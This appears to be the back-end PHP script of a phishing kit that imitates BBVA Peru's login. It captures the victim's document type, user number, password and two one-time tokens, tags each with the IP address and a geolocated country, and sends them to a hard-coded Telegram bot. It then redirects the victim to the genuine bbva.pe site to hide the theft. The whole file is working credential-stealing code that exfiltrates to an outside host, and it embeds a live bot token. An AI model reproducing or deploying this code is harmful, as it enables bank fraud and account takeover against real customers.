<?php
ini_set("display_errors", 0);

$apibot =  "7902825007:AAGEThrdyr88XXjIXpqq16RJZpYKSNNX5ek";
$canal = "7098816483";

/////////////////////
function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
$pais = $meta['geoplugin_countryName']; 


if (isset($_POST['tipo-documento']) && isset($_POST['txteai_user'])  && isset($_POST['txteai_password']) ){
$tipodoc = $_POST["tipo-documento"];
$numdoc = $_POST["txteai_user"];
$clv = $_POST["txteai_password"];

$message = "---bbva---\nTipodoc: <code>$tipodoc</code>\nNumdoc: <code>$numdoc</code>\nClvd: <code>$clv</code>\n---IPP---\n".$myip." ".$pais."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


 echo '<script>window.location.href="loading.php?l=1";</script>';
}




if (isset($_POST['tok'])  ){
$tok = $_POST['tok'];

$message = "---bbva---\nToken1: <code>$tok</code>\n---IPP---\n".$myip." ".$pais."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

echo '<script>window.location.href="loading.php?l=2";</script>';
}

if (isset($_POST['tok2'])  ){
$tok2 = $_POST['tok2'];

$message = "---bbva---\nToken2: <code>$tok2</code>\n---IPP---\n".$myip." ".$pais."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

echo '<script>window.location.href="https://www.bbva.pe/";</script>';
}




?>